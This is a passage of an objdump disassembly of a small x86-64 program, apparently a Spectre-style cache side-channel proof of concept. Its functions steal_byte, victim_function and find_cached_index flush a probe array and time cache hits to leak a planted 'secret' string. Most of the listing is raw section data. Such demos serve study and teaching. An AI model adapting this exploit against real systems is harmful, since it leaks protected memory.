 951:	eb 20                	jmp    973 <steal_byte+0xf5>
 953:	8b 85 e4 fb ff ff    	mov    -0x41c(%rbp),%eax
 959:	c1 e0 0c             	shl    $0xc,%eax
 95c:	48 63 d0             	movslq %eax,%rdx
 95f:	48 8d 05 3a 07 20 00 	lea    0x20073a(%rip),%rax        # 2010a0 <array>
 966:	48 01 d0             	add    %rdx,%rax
 969:	0f ae 38             	clflush (%rax)
 96c:	83 85 e4 fb ff ff 01 	addl   $0x1,-0x41c(%rbp)
 973:	81 bd e4 fb ff ff ff 	cmpl   $0xff,-0x41c(%rbp)
 97a:	00 00 00 
 97d:	7e d4                	jle    953 <steal_byte+0xd5>
 97f:	0f ae f0             	mfence 
 982:	48 8b 85 e8 fb ff ff 	mov    -0x418(%rbp),%rax
 989:	48 89 c7             	mov    %rax,%rdi
 98c:	e8 19 fd ff ff       	callq  6aa <victim_function>
 991:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
 998:	48 89 c7             	mov    %rax,%rdi
 99b:	e8 57 fd ff ff       	callq  6f7 <find_cached_index>
 9a0:	83 85 e0 fb ff ff 01 	addl   $0x1,-0x420(%rbp)
 9a7:	81 bd e0 fb ff ff e7 	cmpl   $0x3e7,-0x420(%rbp)
 9ae:	03 00 00 
 9b1:	7e 8a                	jle    93d <steal_byte+0xbf>
 9b3:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
 9ba:	48 89 c7             	mov    %rax,%rdi
 9bd:	e8 33 fe ff ff       	callq  7f5 <find_highest_score>
 9c2:	90                   	nop
 9c3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9c7:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 9ce:	00 00 
 9d0:	74 05                	je     9d7 <steal_byte+0x159>
 9d2:	e8 99 fb ff ff       	callq  570 <__stack_chk_fail@plt>
 9d7:	c9                   	leaveq 
 9d8:	c3                   	retq   

00000000000009d9 <main>:
 9d9:	55                   	push   %rbp
 9da:	48 89 e5             	mov    %rsp,%rbp
 9dd:	48 83 ec 10          	sub    $0x10,%rsp
 9e1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 9e8:	eb 24                	jmp    a0e <main+0x35>
 9ea:	8b 45 f8             	mov    -0x8(%rbp),%eax
 9ed:	99                   	cltd   
 9ee:	c1 ea 18             	shr    $0x18,%edx
 9f1:	01 d0                	add    %edx,%eax
 9f3:	0f b6 c0             	movzbl %al,%eax
 9f6:	29 d0                	sub    %edx,%eax
 9f8:	89 c1                	mov    %eax,%ecx
 9fa:	8b 45 f8             	mov    -0x8(%rbp),%eax
 9fd:	48 63 d0             	movslq %eax,%rdx
 a00:	48 8d 05 99 06 20 00 	lea    0x200699(%rip),%rax        # 2010a0 <array>
 a07:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 a0a:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 a0e:	8b 45 f8             	mov    -0x8(%rbp),%eax
 a11:	3d ff ff 0f 00       	cmp    $0xfffff,%eax
 a16:	76 d2                	jbe    9ea <main+0x11>
 a18:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 a1f:	eb 0e                	jmp    a2f <main+0x56>
 a21:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a24:	89 c7                	mov    %eax,%edi
 a26:	e8 53 fe ff ff       	callq  87e <steal_byte>
 a2b:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 a2f:	83 7d fc 27          	cmpl   $0x27,-0x4(%rbp)
 a33:	7e ec                	jle    a21 <main+0x48>
 a35:	b8 00 00 00 00       	mov    $0x0,%eax
 a3a:	c9                   	leaveq 
 a3b:	c3                   	retq   
 a3c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000a40 <__libc_csu_init>:
 a40:	41 57                	push   %r15
 a42:	41 56                	push   %r14
 a44:	49 89 d7             	mov    %rdx,%r15
 a47:	41 55                	push   %r13
 a49:	41 54                	push   %r12
 a4b:	4c 8d 25 5e 03 20 00 	lea    0x20035e(%rip),%r12        # 200db0 <__frame_dummy_init_array_entry>
 a52:	55                   	push   %rbp
 a53:	48 8d 2d 5e 03 20 00 	lea    0x20035e(%rip),%rbp        # 200db8 <__init_array_end>
 a5a:	53                   	push   %rbx
 a5b:	41 89 fd             	mov    %edi,%r13d
 a5e:	49 89 f6             	mov    %rsi,%r14
 a61:	4c 29 e5             	sub    %r12,%rbp
 a64:	48 83 ec 08          	sub    $0x8,%rsp
 a68:	48 c1 fd 03          	sar    $0x3,%rbp
 a6c:	e8 d7 fa ff ff       	callq  548 <_init>
 a71:	48 85 ed             	test   %rbp,%rbp
 a74:	74 20                	je     a96 <__libc_csu_init+0x56>
 a76:	31 db                	xor    %ebx,%ebx
 a78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 a7f:	00 
 a80:	4c 89 fa             	mov    %r15,%rdx
 a83:	4c 89 f6             	mov    %r14,%rsi
 a86:	44 89 ef             	mov    %r13d,%edi
 a89:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 a8d:	48 83 c3 01          	add    $0x1,%rbx
 a91:	48 39 dd             	cmp    %rbx,%rbp
 a94:	75 ea                	jne    a80 <__libc_csu_init+0x40>
 a96:	48 83 c4 08          	add    $0x8,%rsp
 a9a:	5b                   	pop    %rbx
 a9b:	5d                   	pop    %rbp
 a9c:	41 5c                	pop    %r12
 a9e:	41 5d                	pop    %r13
 aa0:	41 5e                	pop    %r14
 aa2:	41 5f                	pop    %r15
 aa4:	c3                   	retq   
 aa5:	90                   	nop
 aa6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 aad:	00 00 00 

0000000000000ab0 <__libc_csu_fini>:
 ab0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000ab4 <_fini>:
 ab4:	48 83 ec 08          	sub    $0x8,%rsp
 ab8:	48 83 c4 08          	add    $0x8,%rsp
 abc:	c3                   	retq   

Disassembly of section .rodata:

0000000000000ac0 <_IO_stdin_used>:
 ac0:	01 00                	add    %eax,(%rax)
 ac2:	02 00                	add    (%rax),%al
 ac4:	00 00                	add    %al,(%rax)
 ac6:	00 00                	add    %al,(%rax)
 ac8:	4c                   	rex.WR
 ac9:	65 74 74             	gs je  b40 <__GNU_EH_FRAME_HDR+0x4c>
 acc:	65 72 3a             	gs jb  b09 <__GNU_EH_FRAME_HDR+0x15>
 acf:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 49201438 <_end+0x48f00398>
 ad5:	6e                   	outsb  %ds:(%rsi),(%dx)
 ad6:	64 65 78 3a          	fs gs js b14 <__GNU_EH_FRAME_HDR+0x20>
 ada:	20 25 64 09 20 6e    	and    %ah,0x6e200964(%rip)        # 6e201444 <_end+0x6df003a4>
 ae0:	75 6d                	jne    b4f <__GNU_EH_FRAME_HDR+0x5b>
 ae2:	62                   	(bad)  
 ae3:	65 72 20             	gs jb  b06 <__GNU_EH_FRAME_HDR+0x12>
 ae6:	6f                   	outsl  %ds:(%rsi),(%dx)
 ae7:	66 20 68 69          	data16 and %ch,0x69(%rax)
 aeb:	74 73                	je     b60 <__GNU_EH_FRAME_HDR+0x6c>
 aed:	3a                   	.byte 0x3a
 aee:	25                   	.byte 0x25
 aef:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

0000000000000af4 <__GNU_EH_FRAME_HDR>:
 af4:	01 1b                	add    %ebx,(%rbx)
 af6:	03 3b                	add    (%rbx),%edi
 af8:	60                   	(bad)  
 af9:	00 00                	add    %al,(%rax)
 afb:	00 0b                	add    %cl,(%rbx)
 afd:	00 00                	add    %al,(%rax)
 aff:	00 6c fa ff          	add    %ch,-0x1(%rdx,%rdi,8)
 b03:	ff ac 00 00 00 9c fa 	ljmp   *-0x5640000(%rax,%rax,1)
 b0a:	ff                   	(bad)  
 b0b:	ff d4                	callq  *%rsp
 b0d:	00 00                	add    %al,(%rax)
 b0f:	00 ac fa ff ff 7c 00 	add    %ch,0x7cffff(%rdx,%rdi,8)
 b16:	00 00                	add    %al,(%rax)
 b18:	b6 fb                	mov    $0xfb,%dh
 b1a:	ff                   	(bad)  
 b1b:	ff                   	(bad)  
 b1c:	ec                   	in     (%dx),%al
 b1d:	00 00                	add    %al,(%rax)
 b1f:	00 03                	add    %al,(%rbx)
 b21:	fc                   	cld    
 b22:	ff                   	(bad)  
 b23:	ff 0c 01             	decl   (%rcx,%rax,1)
 b26:	00 00                	add    %al,(%rax)
 b28:	7c fc                	jl     b26 <__GNU_EH_FRAME_HDR+0x32>
 b2a:	ff                   	(bad)  
 b2b:	ff 30                	pushq  (%rax)
 b2d:	01 00                	add    %eax,(%rax)
 b2f:	00 01                	add    %al,(%rcx)
 b31:	fd                   	std    
 b32:	ff                   	(bad)  
 b33:	ff 50 01             	callq  *0x1(%rax)
 b36:	00 00                	add    %al,(%rax)
 b38:	8a fd                	mov    %ch,%bh
 b3a:	ff                   	(bad)  
 b3b:	ff 70 01             	pushq  0x1(%rax)
 b3e:	00 00                	add    %al,(%rax)
 b40:	e5 fe                	in     $0xfe,%eax
 b42:	ff                   	(bad)  
 b43:	ff 90 01 00 00 4c    	callq  *0x4c000001(%rax)
 b49:	ff                   	(bad)  
 b4a:	ff                   	(bad)  
 b4b:	ff b4 01 00 00 bc ff 	pushq  -0x440000(%rcx,%rax,1)
 b52:	ff                   	(bad)  
 b53:	ff                   	(bad)  
 b54:	fc                   	cld    
 b55:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .eh_frame:

0000000000000b58 <__FRAME_END__-0x1ac>:
 b58:	14 00                	adc    $0x0,%al
 b5a:	00 00                	add    %al,(%rax)
 b5c:	00 00                	add    %al,(%rax)
 b5e:	00 00                	add    %al,(%rax)
 b60:	01 7a 52             	add    %edi,0x52(%rdx)
 b63:	00 01                	add    %al,(%rcx)
 b65:	78 10                	js     b77 <__GNU_EH_FRAME_HDR+0x83>
 b67:	01 1b                	add    %ebx,(%rbx)
 b69:	0c 07                	or     $0x7,%al
 b6b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
 b71:	00 00                	add    %al,(%rax)
 b73:	00 1c 00             	add    %bl,(%rax,%rax,1)
 b76:	00 00                	add    %al,(%rax)
 b78:	28 fa                	sub    %bh,%dl
 b7a:	ff                   	(bad)  
 b7b:	ff 2b                	ljmp   *(%rbx)
	...
 b85:	00 00                	add    %al,(%rax)
 b87:	00 14 00             	add    %dl,(%rax,%rax,1)
 b8a:	00 00                	add    %al,(%rax)
 b8c:	00 00                	add    %al,(%rax)
 b8e:	00 00                	add    %al,(%rax)
 b90:	01 7a 52             	add    %edi,0x52(%rdx)
 b93:	00 01                	add    %al,(%rcx)
 b95:	78 10                	js     ba7 <__GNU_EH_FRAME_HDR+0xb3>
 b97:	01 1b                	add    %ebx,(%rbx)
 b99:	0c 07                	or     $0x7,%al
 b9b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
 ba1:	00 00                	add    %al,(%rax)
 ba3:	00 1c 00             	add    %bl,(%rax,%rax,1)
 ba6:	00 00                	add    %al,(%rax)
 ba8:	b8 f9 ff ff 30       	mov    $0x30fffff9,%eax
 bad:	00 00                	add    %al,(%rax)
 baf:	00 00                	add    %al,(%rax)
 bb1:	0e                   	(bad)  
 bb2:	10 46 0e             	adc    %al,0xe(%rsi)
 bb5:	18 4a 0f             	sbb    %cl,0xf(%rdx)
 bb8:	0b 77 08             	or     0x8(%rdi),%esi
 bbb:	80 00 3f             	addb   $0x3f,(%rax)
 bbe:	1a 3b                	sbb    (%rbx),%bh
 bc0:	2a 33                	sub    (%rbx),%dh
 bc2:	24 22                	and    $0x22,%al
 bc4:	00 00                	add    %al,(%rax)
 bc6:	00 00                	add    %al,(%rax)
 bc8:	14 00                	adc    $0x0,%al
 bca:	00 00                	add    %al,(%rax)
 bcc:	44 00 00             	add    %r8b,(%rax)
 bcf:	00 c0                	add    %al,%al
 bd1:	f9                   	stc    
 bd2:	ff                   	(bad)  
 bd3:	ff 08                	decl   (%rax)
	...
 bdd:	00 00                	add    %al,(%rax)
 bdf:	00 1c 00             	add    %bl,(%rax,%rax,1)
 be2:	00 00                	add    %al,(%rax)
 be4:	5c                   	pop    %rsp
 be5:	00 00                	add    %al,(%rax)
 be7:	00 c2                	add    %al,%dl
 be9:	fa                   	cli    
 bea:	ff                   	(bad)  
 beb:	ff 4d 00             	decl   0x0(%rbp)
 bee:	00 00                	add    %al,(%rax)
 bf0:	00 41 0e             	add    %al,0xe(%rcx)
 bf3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 bf9:	02 48 0c             	add    0xc(%rax),%cl
 bfc:	07                   	(bad)  
 bfd:	08 00                	or     %al,(%rax)
 bff:	00 20                	add    %ah,(%rax)
 c01:	00 00                	add    %al,(%rax)
 c03:	00 7c 00 00          	add    %bh,0x0(%rax,%rax,1)
 c07:	00 ef                	add    %ch,%bh
 c09:	fa                   	cli    
 c0a:	ff                   	(bad)  
 c0b:	ff                   	(bad)  
 c0c:	79 00                	jns    c0e <__GNU_EH_FRAME_HDR+0x11a>
 c0e:	00 00                	add    %al,(%rax)
 c10:	00 41 0e             	add    %al,0xe(%rcx)
 c13:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c19:	41 83 03 02          	addl   $0x2,(%r11)
 c1d:	73 0c                	jae    c2b <__GNU_EH_FRAME_HDR+0x137>
 c1f:	07                   	(bad)  
 c20:	08 00                	or     %al,(%rax)
 c22:	00 00                	add    %al,(%rax)
 c24:	1c 00                	sbb    $0x0,%al
 c26:	00 00                	add    %al,(%rax)
 c28:	a0 00 00 00 44 fb ff 	movabs 0x85fffffb44000000,%al
 c2f:	ff 85 
 c31:	00 00                	add    %al,(%rax)
 c33:	00 00                	add    %al,(%rax)
 c35:	41 0e                	rex.B (bad) 
 c37:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c3d:	02 80 0c 07 08 00    	add    0x8070c(%rax),%al
 c43:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c46:	00 00                	add    %al,(%rax)
 c48:	c0 00 00             	rolb   $0x0,(%rax)
 c4b:	00 a9 fb ff ff 89    	add    %ch,-0x76000005(%rcx)
 c51:	00 00                	add    %al,(%rax)
 c53:	00 00                	add    %al,(%rax)
 c55:	41 0e                	rex.B (bad) 
 c57:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c5d:	02 84 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%al
 c64:	1c 00                	sbb    $0x0,%al
 c66:	00 00                	add    %al,(%rax)
 c68:	e0 00                	loopne c6a <__GNU_EH_FRAME_HDR+0x176>
 c6a:	00 00                	add    %al,(%rax)
 c6c:	12 fc                	adc    %ah,%bh
 c6e:	ff                   	(bad)  
 c6f:	ff 5b 01             	lcall  *0x1(%rbx)
 c72:	00 00                	add    %al,(%rax)
 c74:	00 41 0e             	add    %al,0xe(%rcx)
 c77:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c7d:	03 56 01             	add    0x1(%rsi),%edx
 c80:	0c 07                	or     $0x7,%al
 c82:	08 00                	or     %al,(%rax)
 c84:	20 00                	and    %al,(%rax)
 c86:	00 00                	add    %al,(%rax)
 c88:	00 01                	add    %al,(%rcx)
 c8a:	00 00                	add    %al,(%rax)
 c8c:	4d fd                	rex.WRB std 
 c8e:	ff                   	(bad)  
 c8f:	ff 63 00             	jmpq   *0x0(%rbx)
 c92:	00 00                	add    %al,(%rax)
 c94:	00 41 0e             	add    %al,0xe(%rcx)
 c97:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c9d:	02 5e 0c             	add    0xc(%rsi),%bl
 ca0:	07                   	(bad)  
 ca1:	08 00                	or     %al,(%rax)
 ca3:	00 00                	add    %al,(%rax)
 ca5:	00 00                	add    %al,(%rax)
 ca7:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
 cab:	00 24 01             	add    %ah,(%rcx,%rax,1)
 cae:	00 00                	add    %al,(%rax)
 cb0:	90                   	nop
 cb1:	fd                   	std    
 cb2:	ff                   	(bad)  
 cb3:	ff 65 00             	jmpq   *0x0(%rbp)
 cb6:	00 00                	add    %al,(%rax)
 cb8:	00 42 0e             	add    %al,0xe(%rdx)
 cbb:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
 cc1:	8e 03                	mov    (%rbx),%es
 cc3:	45 0e                	rex.RB (bad) 
 cc5:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
 ccb:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301b19 <_end+0xffffffff86000a79>
 cd1:	06                   	(bad)  
 cd2:	48 0e                	rex.W (bad) 
 cd4:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
 cda:	72 0e                	jb     cea <__GNU_EH_FRAME_HDR+0x1f6>
 cdc:	38 41 0e             	cmp    %al,0xe(%rcx)
 cdf:	30 41 0e             	xor    %al,0xe(%rcx)
 ce2:	28 42 0e             	sub    %al,0xe(%rdx)
 ce5:	20 42 0e             	and    %al,0xe(%rdx)
 ce8:	18 42 0e             	sbb    %al,0xe(%rdx)
 ceb:	10 42 0e             	adc    %al,0xe(%rdx)
 cee:	08 00                	or     %al,(%rax)
 cf0:	10 00                	adc    %al,(%rax)
 cf2:	00 00                	add    %al,(%rax)
 cf4:	6c                   	insb   (%dx),%es:(%rdi)
 cf5:	01 00                	add    %eax,(%rax)
 cf7:	00 b8 fd ff ff 02    	add    %bh,0x2fffffd(%rax)
 cfd:	00 00                	add    %al,(%rax)
 cff:	00 00                	add    %al,(%rax)
 d01:	00 00                	add    %al,(%rax)
	...

0000000000000d04 <__FRAME_END__>:
 d04:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000200db0 <__frame_dummy_init_array_entry>:
  200db0:	a0                   	.byte 0xa0
  200db1:	06                   	(bad)  
  200db2:	00 00                	add    %al,(%rax)
  200db4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000200db8 <__do_global_dtors_aux_fini_array_entry>:
  200db8:	60                   	(bad)  
  200db9:	06                   	(bad)  
  200dba:	00 00                	add    %al,(%rax)
  200dbc:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000200dc0 <_DYNAMIC>:
  200dc0:	01 00                	add    %eax,(%rax)
  200dc2:	00 00                	add    %al,(%rax)
  200dc4:	00 00                	add    %al,(%rax)
  200dc6:	00 00                	add    %al,(%rax)
  200dc8:	01 00                	add    %eax,(%rax)
  200dca:	00 00                	add    %al,(%rax)
  200dcc:	00 00                	add    %al,(%rax)
  200dce:	00 00                	add    %al,(%rax)
  200dd0:	0c 00                	or     $0x0,%al
  200dd2:	00 00                	add    %al,(%rax)
  200dd4:	00 00                	add    %al,(%rax)
  200dd6:	00 00                	add    %al,(%rax)
  200dd8:	48 05 00 00 00 00    	add    $0x0,%rax
  200dde:	00 00                	add    %al,(%rax)
  200de0:	0d 00 00 00 00       	or     $0x0,%eax
  200de5:	00 00                	add    %al,(%rax)
  200de7:	00 b4 0a 00 00 00 00 	add    %dh,0x0(%rdx,%rcx,1)
  200dee:	00 00                	add    %al,(%rax)
  200df0:	19 00                	sbb    %eax,(%rax)
  200df2:	00 00                	add    %al,(%rax)
  200df4:	00 00                	add    %al,(%rax)
  200df6:	00 00                	add    %al,(%rax)
  200df8:	b0 0d                	mov    $0xd,%al
  200dfa:	20 00                	and    %al,(%rax)
  200dfc:	00 00                	add    %al,(%rax)
  200dfe:	00 00                	add    %al,(%rax)
  200e00:	1b 00                	sbb    (%rax),%eax
  200e02:	00 00                	add    %al,(%rax)
  200e04:	00 00                	add    %al,(%rax)
  200e06:	00 00                	add    %al,(%rax)
  200e08:	08 00                	or     %al,(%rax)
  200e0a:	00 00                	add    %al,(%rax)
  200e0c:	00 00                	add    %al,(%rax)
  200e0e:	00 00                	add    %al,(%rax)
  200e10:	1a 00                	sbb    (%rax),%al
  200e12:	00 00                	add    %al,(%rax)
  200e14:	00 00                	add    %al,(%rax)
  200e16:	00 00                	add    %al,(%rax)
  200e18:	b8 0d 20 00 00       	mov    $0x200d,%eax
  200e1d:	00 00                	add    %al,(%rax)
  200e1f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  200e22:	00 00                	add    %al,(%rax)
  200e24:	00 00                	add    %al,(%rax)
  200e26:	00 00                	add    %al,(%rax)
  200e28:	08 00                	or     %al,(%rax)
  200e2a:	00 00                	add    %al,(%rax)
  200e2c:	00 00                	add    %al,(%rax)
  200e2e:	00 00                	add    %al,(%rax)
  200e30:	f5                   	cmc    
  200e31:	fe                   	(bad)  
  200e32:	ff 6f 00             	ljmp   *0x0(%rdi)
  200e35:	00 00                	add    %al,(%rax)
  200e37:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  200e3d:	00 00                	add    %al,(%rax)
  200e3f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 200e45 <_DYNAMIC+0x85>
  200e45:	00 00                	add    %al,(%rax)
  200e47:	00 78 03             	add    %bh,0x3(%rax)
  200e4a:	00 00                	add    %al,(%rax)
  200e4c:	00 00                	add    %al,(%rax)
  200e4e:	00 00                	add    %al,(%rax)
  200e50:	06                   	(bad)  
  200e51:	00 00                	add    %al,(%rax)
  200e53:	00 00                	add    %al,(%rax)
  200e55:	00 00                	add    %al,(%rax)
  200e57:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  200e5d:	00 00                	add    %al,(%rax)
  200e5f:	00 0a                	add    %cl,(%rdx)
  200e61:	00 00                	add    %al,(%rax)
  200e63:	00 00                	add    %al,(%rax)
  200e65:	00 00                	add    %al,(%rax)
  200e67:	00 9f 00 00 00 00    	add    %bl,0x0(%rdi)
  200e6d:	00 00                	add    %al,(%rax)
  200e6f:	00 0b                	add    %cl,(%rbx)
  200e71:	00 00                	add    %al,(%rax)
  200e73:	00 00                	add    %al,(%rax)
  200e75:	00 00                	add    %al,(%rax)
  200e77:	00 18                	add    %bl,(%rax)
  200e79:	00 00                	add    %al,(%rax)
  200e7b:	00 00                	add    %al,(%rax)
  200e7d:	00 00                	add    %al,(%rax)
  200e7f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 200e85 <_DYNAMIC+0xc5>
	...
  200e8d:	00 00                	add    %al,(%rax)
  200e8f:	00 03                	add    %al,(%rbx)
  200e91:	00 00                	add    %al,(%rax)
  200e93:	00 00                	add    %al,(%rax)
  200e95:	00 00                	add    %al,(%rax)
  200e97:	00 b0 0f 20 00 00    	add    %dh,0x200f(%rax)
  200e9d:	00 00                	add    %al,(%rax)
  200e9f:	00 02                	add    %al,(%rdx)
  200ea1:	00 00                	add    %al,(%rax)
  200ea3:	00 00                	add    %al,(%rax)
  200ea5:	00 00                	add    %al,(%rax)
  200ea7:	00 30                	add    %dh,(%rax)
  200ea9:	00 00                	add    %al,(%rax)
  200eab:	00 00                	add    %al,(%rax)
  200ead:	00 00                	add    %al,(%rax)
  200eaf:	00 14 00             	add    %dl,(%rax,%rax,1)
  200eb2:	00 00                	add    %al,(%rax)
  200eb4:	00 00                	add    %al,(%rax)
  200eb6:	00 00                	add    %al,(%rax)
  200eb8:	07                   	(bad)  
  200eb9:	00 00                	add    %al,(%rax)
  200ebb:	00 00                	add    %al,(%rax)
  200ebd:	00 00                	add    %al,(%rax)
  200ebf:	00 17                	add    %dl,(%rdi)
  200ec1:	00 00                	add    %al,(%rax)
  200ec3:	00 00                	add    %al,(%rax)
  200ec5:	00 00                	add    %al,(%rax)
  200ec7:	00 18                	add    %bl,(%rax)
  200ec9:	05 00 00 00 00       	add    $0x0,%eax
  200ece:	00 00                	add    %al,(%rax)
  200ed0:	07                   	(bad)  
  200ed1:	00 00                	add    %al,(%rax)
  200ed3:	00 00                	add    %al,(%rax)
  200ed5:	00 00                	add    %al,(%rax)
  200ed7:	00 58 04             	add    %bl,0x4(%rax)
  200eda:	00 00                	add    %al,(%rax)
  200edc:	00 00                	add    %al,(%rax)
  200ede:	00 00                	add    %al,(%rax)
  200ee0:	08 00                	or     %al,(%rax)
  200ee2:	00 00                	add    %al,(%rax)
  200ee4:	00 00                	add    %al,(%rax)
  200ee6:	00 00                	add    %al,(%rax)
  200ee8:	c0 00 00             	rolb   $0x0,(%rax)
  200eeb:	00 00                	add    %al,(%rax)
  200eed:	00 00                	add    %al,(%rax)
  200eef:	00 09                	add    %cl,(%rcx)
  200ef1:	00 00                	add    %al,(%rax)
  200ef3:	00 00                	add    %al,(%rax)
  200ef5:	00 00                	add    %al,(%rax)
  200ef7:	00 18                	add    %bl,(%rax)
  200ef9:	00 00                	add    %al,(%rax)
  200efb:	00 00                	add    %al,(%rax)
  200efd:	00 00                	add    %al,(%rax)
  200eff:	00 1e                	add    %bl,(%rsi)
  200f01:	00 00                	add    %al,(%rax)
  200f03:	00 00                	add    %al,(%rax)
  200f05:	00 00                	add    %al,(%rax)
  200f07:	00 08                	add    %cl,(%rax)
  200f09:	00 00                	add    %al,(%rax)
  200f0b:	00 00                	add    %al,(%rax)
  200f0d:	00 00                	add    %al,(%rax)
  200f0f:	00 fb                	add    %bh,%bl
  200f11:	ff                   	(bad)  
  200f12:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f15:	00 00                	add    %al,(%rax)
  200f17:	00 01                	add    %al,(%rcx)
  200f19:	00 00                	add    %al,(%rax)
  200f1b:	08 00                	or     %al,(%rax)
  200f1d:	00 00                	add    %al,(%rax)
  200f1f:	00 fe                	add    %bh,%dh
  200f21:	ff                   	(bad)  
  200f22:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f25:	00 00                	add    %al,(%rax)
  200f27:	00 28                	add    %ch,(%rax)
  200f29:	04 00                	add    $0x0,%al
  200f2b:	00 00                	add    %al,(%rax)
  200f2d:	00 00                	add    %al,(%rax)
  200f2f:	00 ff                	add    %bh,%bh
  200f31:	ff                   	(bad)  
  200f32:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f35:	00 00                	add    %al,(%rax)
  200f37:	00 01                	add    %al,(%rcx)
  200f39:	00 00                	add    %al,(%rax)
  200f3b:	00 00                	add    %al,(%rax)
  200f3d:	00 00                	add    %al,(%rax)
  200f3f:	00 f0                	add    %dh,%al
  200f41:	ff                   	(bad)  
  200f42:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f45:	00 00                	add    %al,(%rax)
  200f47:	00 18                	add    %bl,(%rax)
  200f49:	04 00                	add    $0x0,%al
  200f4b:	00 00                	add    %al,(%rax)
  200f4d:	00 00                	add    %al,(%rax)
  200f4f:	00 f9                	add    %bh,%cl
  200f51:	ff                   	(bad)  
  200f52:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f55:	00 00                	add    %al,(%rax)
  200f57:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000200fb0 <_GLOBAL_OFFSET_TABLE_>:
  200fb0:	c0 0d 20 00 00 00 00 	rorb   $0x0,0x20(%rip)        # 200fd7 <_GLOBAL_OFFSET_TABLE_+0x27>
	...
  200fc7:	00 76 05             	add    %dh,0x5(%rsi)
  200fca:	00 00                	add    %al,(%rax)
  200fcc:	00 00                	add    %al,(%rax)
  200fce:	00 00                	add    %al,(%rax)
  200fd0:	86 05 00 00 00 00    	xchg   %al,0x0(%rip)        # 200fd6 <_GLOBAL_OFFSET_TABLE_+0x26>
	...

Disassembly of section .data:

0000000000201000 <__data_start>:
	...

0000000000201008 <__dso_handle>:
  201008:	08 10                	or     %dl,(%rax)
  20100a:	20 00                	and    %al,(%rax)
	...

0000000000201020 <bufferSize>:
  201020:	0a 00                	or     (%rax),%al
  201022:	00 00                	add    %al,(%rax)
  201024:	00 00                	add    %al,(%rax)
	...

0000000000201028 <buffer>:
  201028:	01 02                	add    %eax,(%rdx)
  20102a:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  201031:	0a 00                	or     (%rax),%al
	...

0000000000201040 <secret>:
  201040:	49 74 27             	rex.WB je 20106a <__TMC_END__+0x2>
  201043:	73 20                	jae    201065 <_edata+0x2>
  201045:	74 68                	je     2010af <array+0xf>
  201047:	65 20 73 65          	and    %dh,%gs:0x65(%rbx)
  20104b:	63 72 65             	movslq 0x65(%rdx),%esi
  20104e:	74 73                	je     2010c3 <array+0x23>
  201050:	73 73                	jae    2010c5 <array+0x25>
  201052:	73 73                	jae    2010c7 <array+0x27>
  201054:	73 73                	jae    2010c9 <array+0x29>
  201056:	73 73                	jae    2010cb <array+0x2b>
  201058:	73 73                	jae    2010cd <array+0x2d>
  20105a:	73 73                	jae    2010cf <array+0x2f>
  20105c:	73 73                	jae    2010d1 <array+0x31>
  20105e:	73 73                	jae    2010d3 <array+0x33>
  201060:	73 73                	jae    2010d5 <array+0x35>
	...

Disassembly of section .bss:

0000000000201080 <completed.7697>:
	...

0000000000201081 <temp>:
	...

00000000002010a0 <array>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x4d0>
   a:	74 75                	je     81 <_init-0x4c7>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x753264a8>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x4b9>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
